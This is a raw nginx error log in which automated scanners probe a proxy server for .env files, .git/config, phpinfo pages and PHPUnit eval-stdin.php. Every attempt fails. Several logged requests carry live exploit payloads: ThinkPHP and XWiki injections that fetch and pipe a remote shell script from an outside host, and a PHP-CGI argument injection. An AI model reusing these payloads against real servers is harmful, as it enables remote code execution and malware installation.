2025/11/23 06:43:30 [error] 261#261: *20048 open() "/var/www/html/.env" failed (2: No such file or directory), client: 20.10.114.112, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "143.198.9.242"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:08 [error] 212#212: *1879 open() "/var/www/html/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:09 [error] 212#212: *1879 open() "/var/www/html/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:10 [error] 212#212: *1879 open() "/var/www/html/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:10 [error] 212#212: *1879 open() "/var/www/html/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:10 [error] 212#212: *1879 open() "/var/www/html/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:10 [error] 212#212: *1879 open() "/var/www/html/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:10 [error] 212#212: *1879 open() "/var/www/html/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:11 [error] 212#212: *1879 open() "/var/www/html/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:11 [error] 212#212: *1879 open() "/var/www/html/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:11 [error] 212#212: *1879 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:11 [error] 212#212: *1879 open() "/var/www/html/public/index.php" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:31:12 [error] 212#212: *1879 open() "/var/www/html/containers/json" failed (2: No such file or directory), client: 89.35.130.146, server: localhost-nginx-proxy-manager, request: "GET /containers/json HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 06:41:41 [error] 212#212: *1898 open() "/var/www/html/.env" failed (2: No such file or directory), client: 78.153.140.93, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "143.198.9.242"
2025/11/25 06:58:10 [error] 212#212: *1905 open() "/var/www/html/portal/redlion" failed (2: No such file or directory), client: 20.15.163.73, server: localhost-nginx-proxy-manager, request: "GET /portal/redlion HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1910 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1911 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1912 open() "/var/www/html/public/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1913 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /index.php?s=captcha HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1914 open() "/var/www/html/cgi-bin/login.cgi" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /cgi-bin/login.cgi HTTP/1.0", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1916 open() "/var/www/html/cgi-bin/cgi_main.cgi" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /cgi-bin/cgi_main.cgi HTTP/1.1", host: "143.198.9.242", referrer: "http://143.198.9.242/cfg_system_time.htm"
2025/11/25 07:04:55 [error] 212#212: *1918 open() "/var/www/html/xwiki/bin/get/Main/SolrSearch" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%27sh%27%2C%20%27-c%27%2C%20%27%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%29%7Csh%27%5D.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:04:55 [error] 212#212: *1919 open() "/var/www/html/user/register" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:16:13 [error] 212#212: *1929 open() "/var/www/html/.env" failed (2: No such file or directory), client: 141.98.255.243, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:31:10 [error] 212#212: *1936 open() "/var/www/html/hudson" failed (2: No such file or directory), client: 20.163.15.174, server: localhost-nginx-proxy-manager, request: "GET /hudson HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1972 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1973 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1974 open() "/var/www/html/public/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1975 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /index.php?s=captcha HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1976 open() "/var/www/html/cgi-bin/login.cgi" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /cgi-bin/login.cgi HTTP/1.0", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1978 open() "/var/www/html/cgi-bin/cgi_main.cgi" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /cgi-bin/cgi_main.cgi HTTP/1.1", host: "143.198.9.242", referrer: "http://143.198.9.242/cfg_system_time.htm"
2025/11/25 07:54:35 [error] 212#212: *1980 open() "/var/www/html/xwiki/bin/get/Main/SolrSearch" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%27sh%27%2C%20%27-c%27%2C%20%27%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.sdu.sh%29%7Csh%27%5D.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1", host: "143.198.9.242"
2025/11/25 07:54:35 [error] 212#212: *1981 open() "/var/www/html/user/register" failed (2: No such file or directory), client: 192.159.99.95, server: localhost-nginx-proxy-manager, request: "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1", host: "143.198.9.242"
2025/11/25 09:17:48 [error] 212#212: *2044 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 138.197.117.68, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "143.198.9.242"
2025/11/25 09:50:17 [error] 212#212: *2073 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 213.209.157.162, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:33:30 [warn] 212#212: 512 worker_connections are not enough, reusing connections
2025/11/25 10:33:30 [alert] 212#212: *2614 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "143.198.9.242"
2025/11/25 10:33:36 [error] 212#212: *2616 open() "/var/www/html/wiki" failed (2: No such file or directory), client: 199.45.155.90, server: localhost-nginx-proxy-manager, request: "GET /wiki HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:52:36 [error] 212#212: *2627 open() "/var/www/html/phpinfo" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /phpinfo HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:36 [error] 212#212: *2627 open() "/var/www/html/phpinfo.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /phpinfo.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:36 [error] 212#212: *2627 open() "/var/www/html/test.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /test.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:36 [error] 212#212: *2627 open() "/var/www/html/_profiler/phpinfo" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /_profiler/phpinfo HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:37 [error] 212#212: *2627 open() "/var/www/html/info.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /info.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:37 [error] 212#212: *2627 open() "/var/www/html/php.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /php.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:37 [error] 212#212: *2627 open() "/var/www/html/php_info.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /php_info.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:37 [error] 212#212: *2627 open() "/var/www/html/i.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /i.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:37 [error] 212#212: *2627 open() "/var/www/html/pi.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /pi.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:38 [error] 212#212: *2627 open() "/var/www/html/admin/phpinfo.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /admin/phpinfo.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:38 [error] 212#212: *2627 open() "/var/www/html/pinfo.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /pinfo.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:52:38 [error] 212#212: *2627 open() "/var/www/html/php_version.php" failed (2: No such file or directory), client: 91.217.249.207, server: localhost-nginx-proxy-manager, request: "GET /php_version.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 10:58:53 [error] 212#212: *2631 open() "/var/www/html/form.html" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /form.html HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:53 [error] 212#212: *2632 open() "/var/www/html/upl.php" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /upl.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:54 [error] 212#212: *2633 open() "/var/www/html/t4" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /t4 HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:54 [error] 212#212: *2634 "/var/www/html/geoip/index.html" is not found (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /geoip/ HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:55 [alert] 212#212: *3137 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "143.198.9.242"
2025/11/25 10:58:55 [error] 212#212: *3138 open() "/var/www/html/1.php" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /1.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:56 [error] 212#212: *3139 open() "/var/www/html/systembc/password.php" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /systembc/password.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 10:58:56 [error] 212#212: *3140 open() "/var/www/html/password.php" failed (2: No such file or directory), client: 134.199.157.224, server: localhost-nginx-proxy-manager, request: "GET /password.php HTTP/1.1", host: "143.198.9.242"
2025/11/25 11:15:05 [error] 212#212: *3156 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 94.26.88.18, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "143.198.9.242"
2025/11/25 12:31:36 [error] 216#216: *3283 open() "/var/www/html/.env" failed (2: No such file or directory), client: 103.133.105.134, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "143.198.9.242"
2025/11/25 12:32:00 [error] 216#216: *3288 open() "/var/www/html/hello.world" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:00 [error] 216#216: *3288 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:00 [error] 216#216: *3288 open() "/var/www/html/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:00 [error] 216#216: *3288 open() "/var/www/html/vendor/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/vendor/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:01 [error] 216#216: *3288 open() "/var/www/html/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/lib/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/lib/phpunit/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:02 [error] 216#216: *3288 open() "/var/www/html/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:03 [error] 216#216: *3288 open() "/var/www/html/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:03 [error] 216#216: *3288 open() "/var/www/html/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
2025/11/25 12:32:03 [error] 216#216: *3288 open() "/var/www/html/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 2.187.5.151, server: localhost-nginx-proxy-manager, request: "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "143.198.9.242:80"
